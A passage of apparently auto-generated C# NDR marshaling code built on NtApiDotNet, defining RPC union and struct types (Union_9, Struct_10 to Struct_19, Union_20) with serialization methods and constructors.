goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.WriteEmbeddedPointer<Struct_13>(Arm_3, new System.Action<Struct_13>(m.Write_13));\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.WriteEmbeddedPointer<Struct_14>(Arm_4, new System.Action<Struct_14>(m.Write_14));\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                m.WriteEmbeddedPointer<Struct_15>(Arm_5, new System.Action<Struct_15>(m.Write_15));\n                goto done;\n            }\n            if ((Selector == 6))\n            {\n                m.WriteEmbeddedPointer<Struct_16>(Arm_6, new System.Action<Struct_16>(m.Write_16));\n                goto done;\n            }\n            if ((Selector == 7))\n            {\n                m.WriteEmbeddedPointer<Struct_17>(Arm_7, new System.Action<Struct_17>(m.Write_17));\n                goto done;\n            }\n            if ((Selector == 8))\n            {\n                m.WriteEmbeddedPointer<Struct_13>(Arm_8, new System.Action<Struct_13>(m.Write_13));\n                goto done;\n            }\n            if ((Selector == 9))\n            {\n                m.WriteEmbeddedPointer<Struct_13>(Arm_9, new System.Action<Struct_13>(m.Write_13));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_9\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 0))\n            {\n                Arm_0 = u.ReadEmbeddedPointer<Struct_10>(new System.Func<Struct_10>(u.Read_10), false);\n                goto done;\n            }\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_11>(new System.Func<Struct_11>(u.Read_11), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_12>(new System.Func<Struct_12>(u.Read_12), false);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.ReadEmbeddedPointer<Struct_13>(new System.Func<Struct_13>(u.Read_13), false);\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.ReadEmbeddedPointer<Struct_14>(new System.Func<Struct_14>(u.Read_14), false);\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                Arm_5 = u.ReadEmbeddedPointer<Struct_15>(new System.Func<Struct_15>(u.Read_15), false);\n                goto done;\n            }\n            if ((Selector == 6))\n            {\n                Arm_6 = u.ReadEmbeddedPointer<Struct_16>(new System.Func<Struct_16>(u.Read_16), false);\n                goto done;\n            }\n            if ((Selector == 7))\n            {\n                Arm_7 = u.ReadEmbeddedPointer<Struct_17>(new System.Func<Struct_17>(u.Read_17), false);\n                goto done;\n            }\n            if ((Selector == 8))\n            {\n                Arm_8 = u.ReadEmbeddedPointer<Struct_13>(new System.Func<Struct_13>(u.Read_13), false);\n                goto done;\n            }\n            if ((Selector == 9))\n            {\n                Arm_9 = u.ReadEmbeddedPointer<Struct_13>(new System.Func<Struct_13>(u.Read_13), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_9\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_10> Arm_0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_11> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_12> Arm_2;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_13> Arm_3;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_14> Arm_4;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_15> Arm_5;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_16> Arm_6;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_17> Arm_7;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_13> Arm_8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_13> Arm_9;\n        public static Union_9 CreateDefault()\n        {\n            return new Union_9();\n        }\n        public Union_9(uint Selector, System.Nullable<Struct_10> Arm_0, System.Nullable<Struct_11> Arm_1, System.Nullable<Struct_12> Arm_2, System.Nullable<Struct_13> Arm_3, System.Nullable<Struct_14> Arm_4, System.Nullable<Struct_15> Arm_5, System.Nullable<Struct_16> Arm_6, System.Nullable<Struct_17> Arm_7, System.Nullable<Struct_13> Arm_8, System.Nullable<Struct_13> Arm_9)\n        {\n            this.Selector = Selector;\n            this.Arm_0 = Arm_0;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n            this.Arm_3 = Arm_3;\n            this.Arm_4 = Arm_4;\n            this.Arm_5 = Arm_5;\n            this.Arm_6 = Arm_6;\n            this.Arm_7 = Arm_7;\n            this.Arm_8 = Arm_8;\n            this.Arm_9 = Arm_9;\n        }\n    }\n    public struct Struct_10 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member10);\n            m.WriteInt32(Member14);\n            m.WriteInt32(Member18);\n            m.Write_4(Member1C);\n            m.WriteInt32(Member2C);\n            m.WriteInt32(Member30);\n            m.WriteInt32(Member34);\n            m.WriteInt32(Member38);\n            m.WriteInt32(Member3C);\n            m.WriteInt32(Member40);\n            m.WriteInt32(Member44);\n            m.WriteInt32(Member48);\n            m.WriteInt32(Member4C);\n            m.WriteInt32(Member50);\n            m.WriteInt32(Member54);\n            m.WriteInt32(Member58);\n            m.WriteInt32(Member5C);\n            m.WriteInt32(Member60);\n            m.WriteInt32(Member64);\n            m.WriteInt32(Member68);\n            m.WriteInt32(Member6C);\n            m.WriteInt32(Member70);\n            m.WriteInt16(Member74);\n            m.WriteInt16(Member76);\n            m.WriteInt32(Member78);\n            m.WriteInt32(Member7C);\n            m.WriteInt32(Member80);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadInt32();\n            Member14 = u.ReadInt32();\n            Member18 = u.ReadInt32();\n            Member1C = u.Read_4();\n            Member2C = u.ReadInt32();\n            Member30 = u.ReadInt32();\n            Member34 = u.ReadInt32();\n            Member38 = u.ReadInt32();\n            Member3C = u.ReadInt32();\n            Member40 = u.ReadInt32();\n            Member44 = u.ReadInt32();\n            Member48 = u.ReadInt32();\n            Member4C = u.ReadInt32();\n            Member50 = u.ReadInt32();\n            Member54 = u.ReadInt32();\n            Member58 = u.ReadInt32();\n            Member5C = u.ReadInt32();\n            Member60 = u.ReadInt32();\n            Member64 = u.ReadInt32();\n            Member68 = u.ReadInt32();\n            Member6C = u.ReadInt32();\n            Member70 = u.ReadInt32();\n            Member74 = u.ReadInt16();\n            Member76 = u.ReadInt16();\n            Member78 = u.ReadInt32();\n            Member7C = u.ReadInt32();\n            Member80 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public int Member10;\n        public int Member14;\n        public int Member18;\n        public Struct_4 Member1C;\n        public int Member2C;\n        public int Member30;\n        public int Member34;\n        public int Member38;\n        public int Member3C;\n        public int Member40;\n        public int Member44;\n        public int Member48;\n        public int Member4C;\n        public int Member50;\n        public int Member54;\n        public int Member58;\n        public int Member5C;\n        public int Member60;\n        public int Member64;\n        public int Member68;\n        public int Member6C;\n        public int Member70;\n        public short Member74;\n        public short Member76;\n        public int Member78;\n        public int Member7C;\n        public int Member80;\n        public static Struct_10 CreateDefault()\n        {\n            return new Struct_10();\n        }\n        public Struct_10(\n                    string Member0, \n                    string Member8, \n                    int Member10, \n                    int Member14, \n                    int Member18, \n                    Struct_4 Member1C, \n                    int Member2C, \n                    int Member30, \n                    int Member34, \n                    int Member38, \n                    int Member3C, \n                    int Member40, \n                    int Member44, \n                    int Member48, \n                    int Member4C, \n                    int Member50, \n                    int Member54, \n                    int Member58, \n                    int Member5C, \n                    int Member60, \n                    int Member64, \n                    int Member68, \n                    int Member6C, \n                    int Member70, \n                    short Member74, \n                    short Member76, \n                    int Member78, \n                    int Member7C, \n                    int Member80)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member14 = Member14;\n            this.Member18 = Member18;\n            this.Member1C = Member1C;\n            this.Member2C = Member2C;\n            this.Member30 = Member30;\n            this.Member34 = Member34;\n            this.Member38 = Member38;\n            this.Member3C = Member3C;\n            this.Member40 = Member40;\n            this.Member44 = Member44;\n            this.Member48 = Member48;\n            this.Member4C = Member4C;\n            this.Member50 = Member50;\n            this.Member54 = Member54;\n            this.Member58 = Member58;\n            this.Member5C = Member5C;\n            this.Member60 = Member60;\n            this.Member64 = Member64;\n            this.Member68 = Member68;\n            this.Member6C = Member6C;\n            this.Member70 = Member70;\n            this.Member74 = Member74;\n            this.Member76 = Member76;\n            this.Member78 = Member78;\n            this.Member7C = Member7C;\n            this.Member80 = Member80;\n        }\n    }\n    public struct Struct_11 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public static Struct_11 CreateDefault()\n        {\n            return new Struct_11();\n        }\n        public Struct_11(int Member0, string Member8, string Member10, string Member18)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n        }\n    }\n    public struct Struct_12 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteUInt3264(Member38);\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member48, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member50, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member58, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteUInt3264(Member60);\n            m.WriteInt32(Member68);\n            m.WriteInt32(Member6C);\n            m.WriteInt32(Member70);\n            m.WriteInt32(Member74);\n            m.WriteInt32(Member78);\n            m.WriteInt32(Member7C);\n            m.WriteInt32(Member80);\n            m.WriteInt32(Member84);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadUInt3264();\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member50 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member58 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member60 = u.ReadUInt3264();\n            Member68 = u.ReadInt32();\n            Member6C = u.ReadInt32();\n            Member70 = u.ReadInt32();\n            Member74 = u.ReadInt32();\n            Member78 = u.ReadInt32();\n            Member7C = u.ReadInt32();\n            Member80 = u.ReadInt32();\n            Member84 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member38;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member50;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member58;\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member60;\n        public int Member68;\n        public int Member6C;\n        public int Member70;\n        public int Member74;\n        public int Member78;\n        public int Member7C;\n        public int Member80;\n        public int Member84;\n        public static Struct_12 CreateDefault()\n        {\n            return new Struct_12();\n        }\n        public Struct_12(\n                    string Member0, \n                    string Member8, \n                    string Member10, \n                    string Member18, \n                    string Member20, \n                    string Member28, \n                    string Member30, \n                    NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member38, \n                    string Member40, \n                    string Member48, \n                    string Member50, \n                    string Member58, \n                    NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member60, \n                    int Member68, \n                    int Member6C, \n                    int Member70, \n                    int Member74, \n                    int Member78, \n                    int Member7C, \n                    int Member80, \n                    int Member84)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n            this.Member58 = Member58;\n            this.Member60 = Member60;\n            this.Member68 = Member68;\n            this.Member6C = Member6C;\n            this.Member70 = Member70;\n            this.Member74 = Member74;\n            this.Member78 = Member78;\n            this.Member7C = Member7C;\n            this.Member80 = Member80;\n            this.Member84 = Member84;\n        }\n    }\n    public struct Struct_13 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt3264(Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadUInt3264();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member0;\n        public static Struct_13 CreateDefault()\n        {\n            return new Struct_13();\n        }\n        public Struct_13(NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    public struct Struct_14 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member10);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public int Member10;\n        public static Struct_14 CreateDefault()\n        {\n            return new Struct_14();\n        }\n        public Struct_14(string Member0, string Member8, int Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_15 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member10);\n            m.WriteInt32(Member14);\n            m.WriteInt32(Member18);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadInt32();\n            Member14 = u.ReadInt32();\n            Member18 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public int Member10;\n        public int Member14;\n        public int Member18;\n        public static Struct_15 CreateDefault()\n        {\n            return new Struct_15();\n        }\n        public Struct_15(string Member0, string Member8, int Member10, int Member14, int Member18)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member14 = Member14;\n            this.Member18 = Member18;\n        }\n    }\n    public struct Struct_16 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public static Struct_16 CreateDefault()\n        {\n            return new Struct_16();\n        }\n        public Struct_16(int Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    public struct Struct_17 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public int Member8;\n        public static Struct_17 CreateDefault()\n        {\n            return new Struct_17();\n        }\n        public Struct_17(string Member0, int Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_18 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_95), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_95), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_18 CreateDefault()\n        {\n            return new Struct_18();\n        }\n        public Struct_18(int Member0, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_19 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_20(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_20();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_20 Member8;\n        public static Struct_19 CreateDefault()\n        {\n            return new Struct_19();\n        }\n        public Struct_19(int Member0, Union_20 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_20 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_21>(Arm_1, new System.Action<Struct_21>(m.Write_21));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_22>(Arm_2, new System.Action<Struct_22>(m.Write_22));\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.WriteEmbeddedPointer<Struct_23>(Arm_3, new System.Action<Struct_23>(m.Write_23));\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.WriteEmbeddedPointer<Struct_24>(Arm_4, new System.Action<Struct_24>(m.Write_24));\n                goto done;\n            }\n            if ((Selector == 6))\n            {\n                m.WriteEmbeddedPointer<Struct_25>(Arm_6, new System.Action<Struct_25>(m.Write_25));\n                goto done;\n            }\n            if ((Selector == 8))\n            {\n                m.WriteEmbeddedPointer<Struct_27>(Arm_8, new System.Action<Struct_27>(m.Write_27));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_20\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_21>(new System.Func<Struct_21>(u.Read_21), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_22>(new System.Func<Struct_22>(u.Read_22), false);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.ReadEmbeddedPointer<Struct_23>(new System.Func<Struct_23>(u.Read_23), false);\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.ReadEmbeddedPointer<Struct_24>(new System.Func<Struct_24>(u.Read_24), false);\n                goto done;\n            }\n            if ((Selector == 6))\n            {\n                Arm_6 = 